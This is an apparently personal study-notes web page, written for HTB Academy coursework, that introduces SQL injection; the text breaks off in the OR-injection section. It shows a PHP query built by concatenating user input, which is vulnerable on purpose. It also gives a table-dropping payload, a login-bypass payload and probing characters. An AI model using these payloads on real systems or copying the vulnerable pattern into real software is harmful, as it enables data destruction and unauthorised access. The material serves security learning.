<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Hacking/HTB Academy/SQL injections" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.1">
<title data-rh="true">SQL injections | agalera.eu</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://www.agalera.eu/docs/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://www.agalera.eu/docs/Hacking/HTB Academy/SQL injections"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="SQL injections | agalera.eu"><meta data-rh="true" name="description" content="Most modern application use database in their backend to store data. In these applications, the users input some data and in the end this data is used to build SQL queries that are executed in the database."><meta data-rh="true" property="og:description" content="Most modern application use database in their backend to store data. In these applications, the users input some data and in the end this data is used to build SQL queries that are executed in the database."><link data-rh="true" rel="canonical" href="https://www.agalera.eu/docs/Hacking/HTB Academy/SQL injections"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/SQL injections" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.agalera.eu/docs/Hacking/HTB Academy/SQL injections" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"SQL injections","item":"https://www.agalera.eu/docs/Hacking/HTB Academy/SQL injections"}]}</script><link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S8VGYBN25C"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-S8VGYBN25C",{anonymize_ip:!0})</script><link rel="stylesheet" href="/docs/assets/css/styles.26ac5b64.css">
<script src="/docs/assets/js/runtime~main.ba9568cf.js" defer="defer"></script>
<script src="/docs/assets/js/main.81cec253.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><a class="navbar__brand" href="/docs/"><div class="navbar__logo"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/docs/img/logo.svg" alt="agalera.eu" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">agalera.eu</b></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search"><span aria-label="expand searchbar" role="button" class="search-icon" tabindex="0"></span><input id="search_input_react" type="search" placeholder="Loading..." aria-label="Search" class="navbar__search-input search-bar" disabled=""></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/flight-sim/dcs/f5e"><span title="Flight Simulators" class="categoryLinkLabel_W154">Flight Simulators</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/docs/Hacking/HTB Academy/Android Fundamentals"><span title="Hacking" class="categoryLinkLabel_W154">Hacking</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/Hacking/HTB Academy/Android Fundamentals"><span title="HTB Academy" class="categoryLinkLabel_W154">HTB Academy</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Android Fundamentals"><span title="Android Fundamentals" class="linkLabel_WmDU">Android Fundamentals</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/File inclusion"><span title="File inclusion" class="linkLabel_WmDU">File inclusion</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/File transfers"><span title="File transfer" class="linkLabel_WmDU">File transfer</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Introduction to Active Directory"><span title="Introduction to Active Directory" class="linkLabel_WmDU">Introduction to Active Directory</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Introduction to Hardware attacks"><span title="Introduction to hardware attacks" class="linkLabel_WmDU">Introduction to hardware attacks</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Introduction to Purple team"><span title="Introduction to Purple team" class="linkLabel_WmDU">Introduction to Purple team</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Javascript deobfuscation"><span title="Javascript deobfuscation" class="linkLabel_WmDU">Javascript deobfuscation</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Linux fundamentals"><span title="Linux fundamentals" class="linkLabel_WmDU">Linux fundamentals</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Pentest In a Nutshell"><span title="Pentest in a nutshell" class="linkLabel_WmDU">Pentest in a nutshell</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Hacking/HTB Academy/SQL injections"><span title="SQL injections" class="linkLabel_WmDU">SQL injections</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux"><span title="Stack based buffer overflow on Linux" class="linkLabel_WmDU">Stack based buffer overflow on Linux</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows"><span title="Stack based buffer overflow on Windows" class="linkLabel_WmDU">Stack based buffer overflow on Windows</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Web fuzzing"><span title="Web fuzzing" class="linkLabel_WmDU">Web fuzzing</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/Windows fundamentals"><span title="Windows fundamentals" class="linkLabel_WmDU">Windows fundamentals</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Hacking/HTB Academy/ffuf"><span title="Fuzzing with ffuf" class="linkLabel_WmDU">Fuzzing with ffuf</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/languages/bash"><span title="Language security" class="categoryLinkLabel_W154">Language security</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/playbooks/active-directory"><span title="Playbooks" class="categoryLinkLabel_W154">Playbooks</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/tooling/crackmapexec"><span title="Tooling" class="categoryLinkLabel_W154">Tooling</span></a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/useful-links"><span title="Useful links" class="linkLabel_WmDU">Useful links</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/write-up/htb/challenges/critical-ops"><span title="Write-ups" class="categoryLinkLabel_W154">Write-ups</span></a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/linux-useful-commands"><span title="Linux" class="categoryLinkLabel_W154">Linux</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/Shortcuts/Chrome"><span title="Shortcuts" class="categoryLinkLabel_W154">Shortcuts</span></a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/"><span title="Welcome" class="linkLabel_WmDU">Welcome</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/docs/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Hacking</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HTB Academy</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">SQL injections</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>SQL injections</h1></header>
<p>Most modern application use database in their backend to store data. In these applications, the users input some data and in the end this data is used to build SQL queries that are executed in the database.</p>
<p>If the queries are not properly protected, the user might abuse of them to perform any kind of database operation. This is called <code>SQL Injection</code>. The term <code>SQL</code> refers to relational databases.</p>
<p>Typically the database queries are executed this way:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># A connection is establish using username/password and a database.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$conn</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">mysqli</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string double-quoted-string" style="color:#e3116c">&quot;localhost&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string double-quoted-string" style="color:#e3116c">&quot;root&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string double-quoted-string" style="color:#e3116c">&quot;password&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string double-quoted-string" style="color:#e3116c">&quot;users&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># A query is defined</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$query</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string double-quoted-string" style="color:#e3116c">&quot;select * from logins&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># The query is executed and the result is retrieved</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$result</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$conn</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token function" style="color:#d73a49">query</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$query</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">while</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$row</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$result</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token function" style="color:#d73a49">fetch_assoc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">echo</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$row</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string double-quoted-string" style="color:#e3116c">&quot;name&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">.</span><span class="token string double-quoted-string" style="color:#e3116c">&quot;&lt;br&gt;&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Usually user input is introduced in the SQL queries, e.g:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa">$searchInput</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">  </span><span class="token variable" style="color:#36acaa">$_POST</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;findUser&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$query</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string double-quoted-string" style="color:#e3116c">&quot;select * from logins where username like &#x27;%</span><span class="token string double-quoted-string interpolation variable" style="color:#36acaa">$searchInput</span><span class="token string double-quoted-string" style="color:#e3116c">&#x27;&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$result</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$conn</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token function" style="color:#d73a49">query</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$query</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>If this is not properly secured, a user can craft a malicious payload that allow the attacker to execute anything in the database. In this example, when the user inputs <code>admin</code> the query becomes:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> username </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%admin&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>The problem comes with a payload like: <code>1&#x27;; DROP TABLE users;</code>. In this case, the SQL query will be:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> username </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%1&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DROP</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> users</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">&#x27;</span><br></span></code></pre></div></div>
<p>And the user is able to delete the <code>users</code> table.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="types-of-sql-injections">Types of SQL injections<a href="#types-of-sql-injections" class="hash-link" aria-label="Direct link to Types of SQL injections" title="Direct link to Types of SQL injections" translate="no">​</a></h2>
<ul>
<li>In-band: The output of the query is printed directly in the frontend and we can read it.</li>
</ul>
<p>We can have <code>Union</code> based SQL injections which we can pass the column to read and <code>Error</code> based where we leverage PHP or SQL errors to reveal the output of the query.</p>
<ul>
<li>Blind: In this case, we cannot see the output of the query.</li>
</ul>
<p>We can use <code>Boolean</code> logic in SQL or <code>Time</code> based queries, where the query is intentionally delayed using <code>sleep</code> under certain conditions.</p>
<ul>
<li>Out-of-band: Sometimes, we don&#x27;t have any access to the query output. In this case, we can forward the query results to an external system, e.g. DNS server.</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enumerating-for-sql-injections">Enumerating for SQL injections<a href="#enumerating-for-sql-injections" class="hash-link" aria-label="Direct link to Enumerating for SQL injections" title="Direct link to Enumerating for SQL injections" translate="no">​</a></h2>
<p>First of all, we need to know if the input is vulnerable to SQLi. A good way to check this is to inject characters closely related to SQL in our input:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;	-&gt; %27</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;	-&gt; %22</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#	-&gt; %23</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">;	-&gt; %3B</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)	-&gt; %29</span><br></span></code></pre></div></div>
<p>Sometimes, we might need to use the url-encoded value of the character.</p>
<p>When we add this characters, we need to be observant to watch for any error or any other change in the application.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="subverting-query-logic">Subverting query logic<a href="#subverting-query-logic" class="hash-link" aria-label="Direct link to Subverting query logic" title="Direct link to Subverting query logic" translate="no">​</a></h2>
<p>Let&#x27;s image this SQL query:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> password </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;p@ssw0rd&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>If we introduce a <code>&#x27;</code> char:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;&#x27;&#x27; AND password = &#x27;</span><span class="token plain">something&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>We will see a Syntax error in the frontend and now we know this form is vulnerable to SQL injection.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="or-injection">OR injection<a href="#or-injection" class="hash-link" aria-label="Direct link to OR injection" title="Direct link to OR injection" translate="no">​</a></h3>
<p>This simple query can be manipulated with the following payload:</p>
<p><code>admin&#x27; or &#x27;1&#x27;=&#x27;1</code> which will result in the following query:</p>
